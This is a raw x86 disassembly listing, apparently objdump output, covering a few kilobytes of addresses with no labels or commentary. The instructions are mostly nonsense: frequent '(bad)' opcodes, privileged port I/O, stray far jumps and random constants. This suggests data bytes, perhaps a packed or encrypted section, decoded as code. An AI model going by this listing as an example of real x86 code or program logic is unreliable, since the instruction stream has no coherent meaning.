  40a1d4:	and    al,0x28
  40a1d6:	arpl   WORD PTR [edx+0x4067456a],dx
  40a1dc:	pop    eax
  40a1dd:	pop    ss
  40a1de:	push   ds
  40a1df:	ja     0x40a1fe
  40a1e1:	lea    ebp,[esi-0x4a6151c4]
  40a1e7:	adc    ebx,esp
  40a1e9:	(bad)
  40a1ed:	fcmovne st,st(1)
  40a1ef:	sbb    al,0x68
  40a1f1:	push   0xf816650c
  40a1f6:	sub    BYTE PTR [ebx],cl
  40a1f8:	pop    ecx
  40a1f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1fa:	inc    ecx
  40a1fb:	xchg   edx,eax
  40a1fc:	adc    esp,esi
  40a1fe:	adc    ah,BYTE PTR [ebp+0x26c933de]
  40a204:	fsubp  st(7),st
  40a206:	lds    ebp,FWORD PTR ds:0x4b620e79
  40a20c:	test   BYTE PTR [edi],0x84
  40a20f:	mov    eax,ds:0x1e607716
  40a214:	in     eax,0xdf
  40a216:	sub    bh,BYTE PTR [edx-0x15]
  40a219:	dec    ebx
  40a21b:	mov    cs,WORD PTR [ecx-0x56c50718]
  40a221:	mov    cl,0x4f
  40a223:	push   edi
  40a224:	jg     0x40a287
  40a226:	rcl    edx,cl
  40a228:	add    eax,0xf3affcc4
  40a22d:	add    DWORD PTR [ebp-0x2081ef86],ebp
  40a233:	add    dl,bh
  40a235:	push   ecx
  40a236:	mov    bl,0x3b
  40a238:	out    dx,eax
  40a239:	push   0xfffffff8
  40a23b:	les    edx,FWORD PTR [ebp+0x59]
  40a23e:	or     bl,BYTE PTR [ebp+0x267825ea]
  40a244:	ret    0xddba
  40a247:	std    
  40a248:	adc    al,0x5
  40a24a:	push   edx
  40a24b:	dec    eax
  40a24c:	sbb    eax,0xd8bb1995
  40a251:	cld    
  40a252:	push   cs
  40a253:	xchg   cl,ch
  40a255:	mov    ch,0xb3
  40a257:	je     0x40a296
  40a259:	push   es
  40a25a:	out    dx,eax
  40a25b:	cdq    
  40a25c:	mov    WORD PTR [ebx+0x1],?
  40a25f:	sub    BYTE PTR ds:0xcfca2ff7,cl
  40a265:	adc    ch,BYTE PTR ds:0x7e5b9db1
  40a26b:	sbb    eax,0xbeea2459
  40a270:	in     eax,dx
  40a271:	fstp   TBYTE PTR [esi]
  40a273:	das    
  40a274:	stc    
  40a275:	inc    esi
  40a276:	lea    ecx,[esi-0x4]
  40a279:	(bad)  
  40a27b:	push   ebx
  40a27c:	sub    eax,0xffffffbf
  40a27f:	inc    esi
  40a280:	sub    eax,DWORD PTR [edi]
  40a282:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a283:	fild   DWORD PTR [ebx-0x6fae4cd7]
  40a289:	cmc    
  40a28a:	out    dx,al
  40a28b:	mov    cs,WORD PTR [ebx+0x72]
  40a28e:	clc    
  40a28f:	repnz stos DWORD PTR es:[edi],eax
  40a291:	test   ecx,edi
  40a293:	imul   ebx,DWORD PTR [ebx+0x35581f14],0xfd11b71
  40a29d:	dec    eax
  40a29e:	cmp    DWORD PTR [eax+0x277fc141],ebx
  40a2a4:	dec    edi
  40a2a5:	jae    0x40a263
  40a2a7:	lds    ebx,FWORD PTR [ebx-0x54bf54a8]
  40a2ad:	inc    edx
  40a2ae:	inc    edx
  40a2af:	cmp    al,0x18
  40a2b1:	fst    QWORD PTR [ecx]
  40a2b3:	inc    ebx
  40a2b4:	sbb    DWORD PTR [eax-0x40],esi
  40a2b7:	mov    BYTE PTR [ecx-0x17],cl
  40a2ba:	fnsave [esi]
  40a2bc:	jne    0x40a28b
  40a2be:	(bad)  
  40a2bf:	call   DWORD PTR [ecx]
  40a2c1:	sbb    DWORD PTR [edi+0x4b],0x75def773
  40a2c8:	inc    ecx
  40a2c9:	xchg   ebx,eax
  40a2ca:	sti    
  40a2cb:	icebp  
  40a2cc:	call   0xc03e9781
  40a2d1:	or     ecx,ecx
  40a2d3:	aas    
  40a2d4:	ins    BYTE PTR es:[edi],dx
  40a2d5:	push   ds
  40a2d6:	sub    DWORD PTR [edi-0x6fdb63e1],ebx
  40a2dc:	jb     0x40a2ed
  40a2de:	pop    esp
  40a2df:	mov    WORD PTR [ebp-0x61c9e325],?
  40a2e5:	sbb    cl,BYTE PTR [esi+0x34]
  40a2e8:	fnsave [edi+0x52e53b22]
  40a2ee:	pop    ebp
  40a2ef:	sahf   
  40a2f0:	in     al,dx
  40a2f1:	ret    
  40a2f2:	pop    ecx
  40a2f3:	inc    ebp
  40a2f4:	inc    eax
  40a2f5:	mov    ds:0x53541962,eax
  40a2fa:	xchg   esp,eax
  40a2fb:	arpl   WORD PTR [ebx-0x35],sp
  40a2fe:	xchg   esi,eax
  40a2ff:	test   al,0xf0
  40a301:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a302:	frstor [eax]
  40a304:	push   ebp
  40a305:	dec    edi
  40a306:	pop    eax
  40a307:	pop    ebp
  40a308:	sahf   
  40a309:	rcl    BYTE PTR [edi-0x1e5cd223],0xba
  40a310:	aas    
  40a311:	or     dh,BYTE PTR [edi]
  40a313:	mov    ebx,DWORD PTR [eax-0x43]
  40a316:	mov    ?,WORD PTR [edi]
  40a318:	mul    BYTE PTR [edi+0x27]
  40a31b:	xchg   esp,eax
  40a31c:	inc    ebx
  40a31d:	sub    esi,DWORD PTR [ebp-0x6f0aff8d]
  40a323:	jge    0x40a328
  40a325:	outs   dx,BYTE PTR ds:[esi]
  40a326:	std    
  40a327:	pop    edx
  40a328:	mov    ebx,0xb2719d70
  40a32d:	jge    0x40a2fb
  40a32f:	adc    al,0xed
  40a331:	and    esp,DWORD PTR [eax+0x4e6073d5]
  40a337:	mov    eax,ds:0x4079d4df
  40a33c:	jge    0x40a30b
  40a33e:	(bad)  
  40a33f:	jae    0x40a365
  40a341:	bnd jge 0x40a382
  40a344:	mov    esp,DWORD PTR [esi-0x62abc96]
  40a34a:	test   DWORD PTR [esi-0x669446ec],edx
  40a350:	inc    ebp
  40a351:	adc    eax,0x52336cda
  40a356:	push   eax
  40a357:	adc    eax,0x18301245
  40a35c:	mov    al,BYTE PTR [ecx+esi*8-0x13]
  40a360:	lods   al,BYTE PTR ds:[esi]
  40a361:	jbe    0x40a320
  40a363:	push   ds
  40a364:	jae    0x40a365
  40a366:	inc    ebp
  40a367:	shr    dl,cl
  40a369:	shr    DWORD PTR ss:[ebx+0x3b0df54d],0x3c
  40a371:	imul   ecx,DWORD PTR ds:0x65757994,0x41
  40a378:	lea    ebp,[ecx]
  40a37a:	xchg   DWORD PTR [edx-0x19],ecx
  40a37d:	(bad)  
  40a37e:	dec    edx
  40a37f:	pop    ebx
  40a380:	mov    al,BYTE PTR [ecx-0x1c]
  40a383:	mov    edx,0x64009e50
  40a388:	or     al,0x8d
  40a38a:	lea    edx,[eax]
  40a38c:	sub    BYTE PTR ds:[edi+ebp*1-0xce7327b],0xcf
  40a395:	data16 jg 0x40a3cf
  40a398:	popa   
  40a399:	ins    DWORD PTR es:[edi],dx
  40a39a:	movq   mm5,QWORD PTR [ecx-0x28a8a304]
  40a3a1:	and    eax,0x8dcd3c85
  40a3a6:	aad    0xb
  40a3a8:	dec    ebp
  40a3a9:	retf   0xd896
  40a3ac:	fisubr WORD PTR [edi-0x5734c6d2]
  40a3b2:	ins    DWORD PTR es:[edi],dx
  40a3b3:	fisttp QWORD PTR [eax-0x22700338]
  40a3b9:	fs dec esp
  40a3bb:	mov    ch,0xfc
  40a3bd:	dec    edx
  40a3be:	jne    0x40a3a0
  40a3c0:	ins    BYTE PTR es:[edi],dx
  40a3c1:	jb     0x40a392
  40a3c3:	rcl    DWORD PTR fs:[ebp-0x38],cl
  40a3c7:	(bad)  
  40a3c8:	sub    eax,0x546e1780
  40a3cd:	jns    0x40a384
  40a3cf:	add    al,0x23
  40a3d1:	or     al,0xae
  40a3d3:	add    DWORD PTR [ebx],esi
  40a3d5:	retf   
  40a3d6:	add    ch,al
  40a3d8:	inc    ebp
  40a3d9:	fstp   QWORD PTR [ebx]
  40a3db:	aad    0xbf
  40a3dd:	or     al,0x86
  40a3df:	ficomp WORD PTR [ebx]
  40a3e1:	or     al,0xf2
  40a3e3:	ins    DWORD PTR es:[edi],dx
  40a3e4:	add    eax,0x7875b25e
  40a3e9:	lods   eax,DWORD PTR ds:[esi]
  40a3ea:	clc    
  40a3eb:	(bad)  
  40a3ec:	sub    BYTE PTR [ecx],cl
  40a3ee:	es loope 0x40a3e1
  40a3f1:	cmp    al,0x54
  40a3f3:	cmp    BYTE PTR [eax+ecx*4+0x8],dh
  40a3f7:	pop    ebx
  40a3f8:	adc    eax,0xe87f9b91
  40a3fd:	imul   ebp,esp,0xbbbb3ca
  40a403:	pop    esi
  40a404:	out    0x0,al
  40a406:	js     0x40a40f
  40a408:	test   ecx,0x49553190
  40a40e:	mov    DWORD PTR [ebx+eiz*1+0x4d860af],edi
  40a415:	jne    0x40a445
  40a417:	jne    0x40a450
  40a419:	and    al,0xf
  40a41b:	or     bh,dh
  40a41d:	push   0xb74d50bc
  40a422:	inc    esp
  40a423:	adc    al,0xa3
  40a426:	loope  0x40a461
  40a428:	push   eax
  40a429:	pushf  
  40a42a:	push   edi
  40a42b:	out    dx,al
  40a42c:	and    al,0xa7
  40a42e:	mov    edi,DWORD PTR [ebx+0x2d]
  40a431:	frstor [esi-0x700c5e38]
  40a437:	(bad)  
  40a438:	pop    esp
  40a439:	call   0x73613b87
  40a43e:	pop    ebp
  40a43f:	jmp    0xc8bc:0x9dbac898
  40a446:	dec    edi
  40a447:	in     al,dx
  40a448:	loope  0x40a455
  40a44a:	and    ebp,0xffffff88
  40a44d:	(bad)
  40a451:	(bad)  
  40a452:	(bad)  
  40a453:	in     eax,0x54
  40a455:	lock cmovs esp,DWORD PTR [edx]
  40a459:	push   edx
  40a45a:	imul   esi,DWORD PTR [ebx+0x3b],0x63
  40a45e:	adc    BYTE PTR [ebx-0x7643026e],al
  40a464:	int3   
  40a465:	pop    ss
  40a466:	test   eax,0xb5938f70
  40a46b:	xchg   BYTE PTR [ebx+0x28],bh
  40a46e:	repz fwait
  40a470:	push   ds
  40a471:	je     0x40a496
  40a473:	pop    edi
  40a474:	mov    ds,WORD PTR [eax+0x75]
  40a477:	mov    cl,bh
  40a479:	mov    ch,0x0
  40a47b:	or     eax,0x56acc2db
  40a480:	mov    dl,0x4f
  40a482:	and    esp,0x1ab6a77
  40a488:	or     ebx,DWORD PTR [ebp-0x63f58041]
  40a48e:	dec    ecx
  40a48f:	ins    DWORD PTR es:[edi],dx
  40a490:	sahf   
  40a491:	mov    eax,ds:0xc9b54be3
  40a496:	ins    BYTE PTR es:[edi],dx
  40a497:	scas   eax,DWORD PTR es:[edi]
  40a498:	push   eax
  40a499:	mov    bl,0x5c
  40a49b:	mov    bl,0x6a
  40a49d:	jbe    0x40a43b
  40a49f:	mov    eax,0x75156083
  40a4a4:	icebp  
  40a4a5:	(bad)  
  40a4a6:	ds push eax
  40a4a8:	jmp    0xfe046219
  40a4ad:	ins    DWORD PTR es:[edi],dx
  40a4ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4af:	mov    BYTE PTR [edx],bl
  40a4b1:	neg    BYTE PTR [edi+0x4e3b82d5]
  40a4b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4b8:	jp     0x40a522
  40a4ba:	aaa    
  40a4bb:	and    BYTE PTR [ebx-0x1fd4b023],bl
  40a4c1:	jns    0x40a4da
  40a4c3:	stc    
  40a4c4:	shl    DWORD PTR [edx+edx*4],1
  40a4c7:	mov    WORD PTR [esi-0x4de7dd1e],es
  40a4cd:	stos   DWORD PTR es:[edi],eax
  40a4ce:	sahf   
  40a4cf:	int3   
  40a4d0:	lds    edx,FWORD PTR [esp+ecx*1+0x23e587fe]
  40a4d7:	scas   eax,DWORD PTR es:[edi]
  40a4d8:	scas   al,BYTE PTR es:[edi]
  40a4d9:	aaa    
  40a4da:	xchg   esp,eax
  40a4db:	lahf   
  40a4dc:	popa   
  40a4dd:	jmp    0xf993:0x3c3b167c
  40a4e4:	push   ebp
  40a4e5:	cwde   
  40a4e6:	in     al,dx
  40a4e7:	push   es
  40a4e8:	mov    esp,0xde904432
  40a4ed:	xchg   cl,ah
  40a4ef:	into   
  40a4f0:	fldenv [esi-0x57e049fa]
  40a4f6:	and    DWORD PTR [ebx+0xc33a1b4],0xbe037d10
  40a500:	inc    edx
  40a501:	xchg   ecx,eax
  40a502:	jnp    0x40a54e
  40a504:	rol    BYTE PTR [edi-0xa],0x95
  40a508:	push   ss
  40a509:	xor    DWORD PTR [ebx-0x2c4d997f],0xa7512c5c
  40a513:	inc    esi
  40a514:	rol    DWORD PTR fs:[edi+0x598c6c37],0xd0
  40a51c:	jg     0x40a4a0
  40a51e:	add    al,0xa4
  40a520:	or     al,0x2
  40a522:	lahf   
  40a523:	jmp    0xbe64:0x4ac2c889
  40a52a:	adc    eax,0x51daefbd
  40a52f:	dec    eax
  40a530:	out    0xa0,eax
  40a532:	push   DWORD PTR [ecx+edi*8-0x8f146ff]
  40a539:	cmp    al,0x9
  40a53b:	inc    esi
  40a53c:	jns    0x40a4c9
  40a53e:	loop   0x40a4c7
  40a540:	pop    es
  40a541:	sbb    edi,edi
  40a543:	add    ebp,ebp
  40a545:	lds    edx,FWORD PTR [edx+0x2e]
  40a548:	lds    esi,FWORD PTR [ecx+0x3]
  40a54b:	scas   al,BYTE PTR es:[edi]
  40a54c:	mov    ch,0x6f
  40a54e:	icebp  
  40a54f:	aaa    
  40a550:	jae    0x40a54f
  40a552:	xor    esp,DWORD PTR fs:[ebp-0x48cf3e7a]
  40a559:	sbb    esi,DWORD PTR [edx-0x29]
  40a55c:	or     dl,bl
  40a55e:	mov    al,0x17
  40a560:	cmp    bl,BYTE PTR [ecx+ebp*2-0xd36039a]
  40a567:	mov    ecx,DWORD PTR [ebx]
  40a569:	adc    ebp,edi
  40a56b:	mov    al,ds:0x44bfc948
  40a570:	push   0x25
  40a572:	mov    ah,0xcb
  40a574:	inc    eax
  40a575:	inc    esi
  40a576:	dec    ebp
  40a577:	mov    edi,0x59b51713
  40a57c:	stc    
  40a57d:	lods   al,BYTE PTR ds:[esi]
  40a57e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a57f:	and    DWORD PTR [ecx-0xf],0x8
  40a583:	push   edx
  40a584:	push   edx
  40a585:	call   0x5407:0x27f7c15b
  40a58c:	hlt    
  40a58d:	out    dx,eax
  40a58e:	adc    eax,0x342a6c2a
  40a593:	jbe    0x40a5a3
  40a595:	retf   0xdff
  40a598:	mov    ch,0x66
  40a59a:	popf   
  40a59b:	shl    edx,1
  40a59d:	cmp    BYTE PTR [eax],0x1e
  40a5a0:	rol    BYTE PTR [ecx+0x69167164],0x62
  40a5a7:	inc    edx
  40a5a8:	dec    edx
  40a5a9:	sbb    esi,DWORD PTR [edi+edi*2-0x5a]
  40a5ad:	push   ebx
  40a5ae:	fidiv  WORD PTR [esi+0x4af7e5da]
  40a5b4:	mov    al,ds:0xb2397fc5
  40a5b9:	jbe    0x40a5e8
  40a5bb:	dec    ebx
  40a5bc:	mov    ah,dl
  40a5be:	cmp    al,0x5
  40a5c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5c1:	pop    es
  40a5c2:	lods   eax,DWORD PTR ds:[esi]
  40a5c3:	das    
  40a5c4:	inc    ecx
  40a5c5:	jb     0x40a5ca
  40a5c7:	or     BYTE PTR [ecx+0x8bafa7],bh
  40a5cd:	loope  0x40a557
  40a5cf:	xor    dh,al
  40a5d1:	jne    0x40a5ee
  40a5d3:	xchg   BYTE PTR [edx],cl
  40a5d5:	jg     0x40a5c4
  40a5d7:	cmc    
  40a5d8:	sti    
  40a5d9:	arpl   WORD PTR [edi+0x24ec2598],di
  40a5df:	leave  
  40a5e0:	adc    bl,dh
  40a5e2:	cmp    al,0x78
  40a5e4:	lods   eax,DWORD PTR ds:[esi]
  40a5e5:	pushf  
  40a5e6:	xchg   ecx,eax
  40a5e7:	fs jns 0x40a61f
  40a5ea:	push   ss
  40a5eb:	test   al,0x8c
  40a5ed:	mov    al,fs:0x1f380863
  40a5f3:	fdiv   st(2),st
  40a5f5:	mov    dl,0x77
  40a5f7:	add    ebx,DWORD PTR [edx+0x10]
  40a5fa:	push   ebp
  40a5fb:	adc    edi,edi
  40a5fd:	icebp  
  40a5fe:	test   eax,0x6f8e5396
  40a603:	and    BYTE PTR [ebp-0x51],dl
  40a606:	pop    ecx
  40a607:	mov    ecx,0xcdc469fa
  40a60c:	mov    edx,0xe14f8a0e
  40a611:	retf   0x6ca5
  40a614:	dec    edi
  40a615:	sbb    al,0x90
  40a617:	(bad)  
  40a618:	ss call 0x91c63d27
  40a61e:	out    0x49,al
  40a620:	sbb    BYTE PTR [ecx-0x3d],0x6
  40a624:	fstp   TBYTE PTR [eax-0x601a2b6a]
  40a62a:	push   esp
  40a62b:	cmp    eax,0xaf9a862
  40a630:	push   ecx
  40a631:	loop   0x40a5fc
  40a633:	add    eax,0x3b230c7b
  40a638:	add    bh,BYTE PTR [ebx-0x71]
  40a63b:	sub    al,0x6
  40a63d:	or     al,0xcc
  40a63f:	pop    edi
  40a640:	stc    
  40a641:	es push es
  40a643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a644:	jp     0x40a6b9
  40a646:	int3   
  40a647:	sub    ebx,DWORD PTR [esi-0x6420ec01]
  40a64d:	std    
  40a64e:	test   al,0x9f
  40a650:	stc    
  40a651:	mov    eax,ds:0xf938cad4
  40a656:	push   ecx
  40a657:	sub    BYTE PTR [edi-0x5576098a],ah
  40a65d:	sti    
  40a65e:	aas    
  40a65f:	jmp    FWORD PTR [ebx]
  40a661:	jmp    0x40a608
  40a663:	jbe    0x40a5e7
  40a665:	sbb    BYTE PTR [ebx-0x5fc11ae1],dl
  40a66b:	pop    eax
  40a66c:	arpl   dx,sp
  40a66e:	pop    ebp
  40a66f:	aam    0x65
  40a671:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a673:	into   
  40a674:	xchg   ecx,eax
  40a676:	add    eax,0x1d929f3e
  40a67b:	nop
  40a67c:	ins    BYTE PTR es:[edi],dx
  40a67d:	fs jno 0x40a6bd
  40a680:	clc    
  40a681:	pop    esi
  40a682:	sbb    bh,BYTE PTR [esi+0xcdc31fd]
  40a688:	inc    ecx
  40a689:	in     eax,dx
  40a68a:	push   cs
  40a68b:	jmp    0x66af:0xc3d61686
  40a692:	(bad)  
  40a693:	pop    ebx
  40a694:	inc    edx
  40a695:	cmc    
  40a696:	scas   al,BYTE PTR es:[edi]
  40a697:	fldcw  WORD PTR [ebx+0x7b]
  40a69a:	xchg   esi,eax
  40a69b:	adc    al,0x2f
  40a69d:	push   edx
  40a69e:	in     eax,dx
  40a69f:	lds    edi,FWORD PTR [ebp-0xd8b6379]
  40a6a5:	xlat   BYTE PTR ds:[ebx]
  40a6a6:	xchg   esi,eax
  40a6a7:	mov    bl,0x23
  40a6a9:	in     al,dx
  40a6aa:	or     eax,0x5e73904f
  40a6af:	(bad)  
  40a6b1:	and    BYTE PTR [ebx-0x4fbd711a],dh
  40a6b7:	sub    DWORD PTR [edi],edx
  40a6b9:	mov    dl,0x8c
  40a6bb:	jl     0x40a729
  40a6bd:	push   ss
  40a6be:	es in  al,0x59
  40a6c1:	cwde   
  40a6c2:	jp     0x40a6c4
  40a6c4:	inc    edi
  40a6c5:	adc    eax,0x5fc12d29
  40a6ca:	push   es
  40a6cb:	xor    cl,dl
  40a6cd:	sub    bl,bl
  40a6cf:	mov    cl,0x31
  40a6d1:	sahf   
  40a6d2:	mov    ecx,0xbba1b095
  40a6d7:	out    dx,eax
  40a6d8:	xor    DWORD PTR [edi-0x38],eax
  40a6db:	adc    cl,0x16
  40a6de:	xor    eax,0xe86cc719
  40a6e3:	or     al,BYTE PTR [eax-0x5ef76e58]
  40a6e9:	in     eax,dx
  40a6ea:	mov    bh,0x31
  40a6ec:	pusha  
  40a6ed:	add    ebx,ebp
  40a6ef:	xchg   edx,eax
  40a6f0:	add    edx,DWORD PTR [edi-0x19e1e9df]
  40a6f6:	div    esp
  40a6f8:	cli    
  40a6f9:	push   ds
  40a6fa:	jae    0x40a6ac
  40a6fc:	(bad)  
  40a6fd:	pop    ss
  40a6fe:	inc    esi
  40a6ff:	dec    ecx
  40a700:	pop    ebx
  40a701:	add    al,0x81
  40a703:	addr16 ret 0xd994
  40a707:	daa    
  40a708:	ret    0xd4a
  40a70b:	or     al,BYTE PTR [edi+eiz*1]
  40a70e:	es sub cl,bh
  40a711:	adc    BYTE PTR [edi+ebx*4-0x729f2c5b],dl
  40a718:	push   cs
  40a719:	cmp    bh,bh
  40a71b:	fisttp QWORD PTR [ecx+eax*4]
  40a71e:	test   BYTE PTR [esi+0x71],dl
  40a721:	outs   dx,DWORD PTR ds:[esi]
  40a722:	pusha  
  40a723:	adc    BYTE PTR [esi],bl
  40a725:	mov    bl,0xc0
  40a727:	mov    ds,eax
  40a729:	in     al,0x3c
  40a72b:	cli    
  40a72c:	adc    ecx,ebx
  40a72e:	in     eax,dx
  40a72f:	inc    ecx
  40a730:	mov    ebp,0x7bc5f8c4
  40a735:	push   esi
  40a736:	dec    ecx
  40a737:	mov    ch,0xfc
  40a739:	loop   0x40a7ab
  40a73b:	(bad)  
  40a73c:	call   0x77eb:0x7d554d15
  40a743:	jbe    0x40a6c9
  40a745:	test   al,0xbd
  40a747:	dec    esi
  40a748:	stos   BYTE PTR es:[edi],al
  40a749:	jns    0x40a6d7
  40a74b:	inc    eax
  40a74c:	sub    eax,0xf38eb8a
  40a751:	or     eax,0x70ab5263
  40a756:	dec    esi
  40a757:	ins    BYTE PTR es:[edi],dx
  40a758:	cmc    
  40a759:	das    
  40a75a:	ficomp DWORD PTR [esp+edi*8]
  40a75d:	stos   DWORD PTR es:[edi],eax
  40a75e:	(bad)  
  40a75f:	shl    DWORD PTR [edx-0x42],0x42
  40a763:	neg    esp
  40a765:	and    eax,0x6b322e93
  40a76a:	xchg   ecx,eax
  40a76b:	and    ebx,DWORD PTR [edi-0x33f92377]
  40a771:	enter  0x7ecd,0x60
  40a775:	ins    BYTE PTR es:[edi],dx
  40a776:	dec    edx
  40a777:	push   0xffffffac
  40a779:	cdq    
  40a77a:	push   ss
  40a77b:	mov    ?,WORD PTR [ebx-0x3d]
  40a77e:	adc    DWORD PTR [eax+edi*4],esp
  40a781:	mov    ds:0xad13367e,eax
  40a786:	push   esp
  40a787:	jns    0x40a800
  40a789:	loope  0x40a78b
  40a78b:	into   
  40a78c:	sti    
  40a78d:	or     BYTE PTR [esp+ebx*8+0x31eaf6b6],0x26
  40a795:	cmc    
  40a796:	call   0xd461:0x88576c9b
  40a79d:	cmp    ah,BYTE PTR [edi-0x4f4f9516]
  40a7a3:	fld    TBYTE PTR [eax]
  40a7a5:	fisubr DWORD PTR [edx-0x20bed939]
  40a7ab:	ret    
  40a7ac:	stc    
  40a7ad:	push   ss
  40a7ae:	retf   0x6e89
  40a7b1:	push   ebx
  40a7b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7b3:	and    BYTE PTR [esi],ch
  40a7b5:	pop    ss
  40a7b6:	ret    
  40a7b7:	in     al,0x60
  40a7b9:	bound  esp,QWORD PTR [edi]
  40a7bb:	lods   eax,DWORD PTR ds:[esi]
  40a7bc:	push   0xffffffdc
  40a7be:	jge    0x40a7f8
  40a7c0:	or     DWORD PTR [edi],ebp
  40a7c2:	outs   dx,DWORD PTR ds:[esi]
  40a7c3:	(bad)
  40a7c6:	mov    ebx,0x85db8dd7
  40a7cb:	(bad)  
  40a7cd:	scas   al,BYTE PTR es:[edi]
  40a7ce:	sti    
  40a7cf:	test   DWORD PTR [edi+0x69],0xc3f05978
  40a7d6:	xchg   esi,eax
  40a7d7:	test   eax,0x241a7876
  40a7dc:	inc    ebp
  40a7dd:	(bad)  
  40a7de:	xor    eax,0xf72d4821
  40a7e3:	loop   0x40a7f8
  40a7e5:	int3   
  40a7e6:	sbb    dh,BYTE PTR [ebx]
  40a7e8:	push   esi
  40a7e9:	pusha  
  40a7ea:	out    0xbd,al
  40a7ec:	sbb    BYTE PTR [edi+0x3c],dl
  40a7ef:	sbb    BYTE PTR [edx],ch
  40a7f1:	scas   eax,DWORD PTR es:[edi]
  40a7f2:	scas   eax,DWORD PTR es:[edi]
  40a7f3:	aam    0xb4
  40a7f5:	fwait
  40a7f6:	das    
  40a7f7:	sbb    BYTE PTR [ebx+edx*1-0x31],ah
  40a7fb:	cs xor al,0x70
  40a7fe:	adc    DWORD PTR [edx],0xcf62b303
  40a804:	imul   ecx,edi,0x48
  40a807:	shr    BYTE PTR [ebx],0x8c
  40a80a:	mov    esi,0x8decaf7b
  40a80f:	iret   
  40a810:	aad    0x92
  40a812:	das    
  40a813:	jmp    0x1e94a3cf
  40a818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a819:	push   edx
  40a81a:	xor    eax,ebp
  40a81c:	mov    esp,0x59424fac
  40a821:	aam    0x1
  40a823:	inc    eax
  40a824:	mov    edx,0xbd6c5ea9
  40a829:	dec    edx
  40a82a:	fist   DWORD PTR [esi-0x30]
  40a82d:	push   edx
  40a82e:	(bad)  
  40a82f:	dec    edi
  40a830:	dec    esi
  40a831:	(bad)  
  40a832:	shld   DWORD PTR [ecx],ebx,0x4d
  40a836:	sub    BYTE PTR [edx],0x23
  40a839:	and    eax,DWORD PTR [ecx-0x1e]
  40a83c:	push   cs
  40a83d:	or     DWORD PTR [ebx],ebx
  40a83f:	psubsb mm1,QWORD PTR [esi-0xcf3197]
  40a846:	and    al,0xf3
  40a848:	add    al,0x1d
  40a84a:	mov    dh,0xc4
  40a84c:	(bad)  
  40a84d:	pop    ss
  40a84e:	lea    eax,[edx-0x6bff588d]
  40a854:	es lahf 
  40a856:	jge    0x40a836
  40a858:	ins    BYTE PTR es:[edi],dx
  40a859:	mov    eax,0x81162632
  40a85e:	mov    esp,0xcbfe9989
  40a863:	sub    DWORD PTR [esi+0x61],edi
  40a866:	std    
  40a867:	pop    esp
  40a868:	in     eax,dx
  40a869:	aam    0xee
  40a86b:	fbstp  TBYTE PTR [eax+ebp*1+0xda752a]
  40a872:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a873:	out    0xcc,al
  40a875:	push   ss
  40a876:	aas    
  40a877:	pop    ss
  40a878:	adc    BYTE PTR [eax-0x29e47f14],ah
  40a87e:	mov    dl,0xa0
  40a880:	(bad)  
  40a882:	jl     0x40a820
  40a884:	mov    edx,0x2da05572
  40a889:	stc    
  40a88a:	and    bl,dl
  40a88c:	dec    DWORD PTR [ecx-0x65]
  40a88f:	(bad)  
  40a890:	push   cs
  40a891:	adc    eax,0xe71f2856
  40a896:	inc    eax
  40a897:	pop    es
  40a898:	and    al,0xed
  40a89a:	rcl    ecx,cl
  40a89c:	pop    ebx
  40a89d:	pop    eax
  40a89e:	pop    ecx
  40a89f:	cmp    al,0xca
  40a8a1:	fld    TBYTE PTR ss:[esi-0x7c]
  40a8a5:	pop    ebp
  40a8a6:	jmp    0x5977:0xcb76b593
  40a8ad:	or     ebx,DWORD PTR [edi+0x5f]
  40a8b0:	pop    edx
  40a8b1:	(bad)  
  40a8b2:	retf   0xa897
  40a8b5:	iret   
  40a8b6:	adc    bh,0x11
  40a8b9:	imul   eax,DWORD PTR [esi-0x72f463ae],0xffffffa3
  40a8c0:	xchg   ebp,eax
  40a8c1:	shl    BYTE PTR ds:0x7f4bdac,cl
  40a8c7:	xor    dl,BYTE PTR [esi]
  40a8c9:	dec    esi
  40a8ca:	and    BYTE PTR [esi],al
  40a8cc:	mov    edx,0x8cac2e71
  40a8d1:	or     eax,esp
  40a8d3:	ja     0x40a8d6
  40a8d5:	cmp    eax,0x1ccd652d
  40a8da:	or     ch,BYTE PTR [edi+0x73988a8e]
  40a8e0:	dec    edi
  40a8e1:	scas   al,BYTE PTR es:[edi]
  40a8e2:	cmp    eax,0x3d6c2803
  40a8e7:	repz out 0xaa,al
  40a8ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8eb:	(bad)  [eax-0x4d31434b]
  40a8f1:	mov    ds:0xd22fa3e2,eax
  40a8f6:	jmp    0xa148cff9
  40a8fb:	adc    esp,ecx
  40a8fd:	mov    eax,ds:0xc11b32b0
  40a902:	push   0xb7eb47f2
  40a907:	pop    eax
  40a908:	pop    edi
  40a909:	ret    
  40a90a:	aaa    
  40a90b:	push   edi
  40a90c:	mov    eax,0x4ea797eb
  40a911:	in     al,0x6c
  40a913:	call   FWORD PTR [esi+0x2b]
  40a916:	inc    esi
  40a917:	mov    DWORD PTR [ebx+0x67608832],ebx
  40a91d:	sub    al,0x72
  40a91f:	jge    0x40a95e
  40a921:	jecxz  0x40a8cd
  40a923:	and    eax,0xbd276353
  40a928:	cli    
  40a929:	or     al,0xa3
  40a92b:	(bad)  
  40a92c:	sar    BYTE PTR [ecx],cl
  40a92e:	pushf  
  40a92f:	test   edi,edx
  40a931:	aaa    
  40a932:	mov    DWORD PTR [edi-0x71],ebx
  40a935:	popf   
  40a936:	dec    ebx
  40a937:	jmp    0x34db6964
  40a93c:	ins    BYTE PTR es:[edi],dx
  40a93d:	jecxz  0x40a97a
  40a93f:	pop    esp
  40a940:	arpl   WORD PTR [eax-0x48242a23],di
  40a946:	leave  
  40a947:	push   esi
  40a948:	sub    BYTE PTR [esi+0x641bb576],bh
  40a94e:	pop    es
  40a94f:	jle    0x40a8f6
  40a951:	das    
  40a952:	div    al
  40a954:	or     BYTE PTR [ebp+0x164bb502],dl
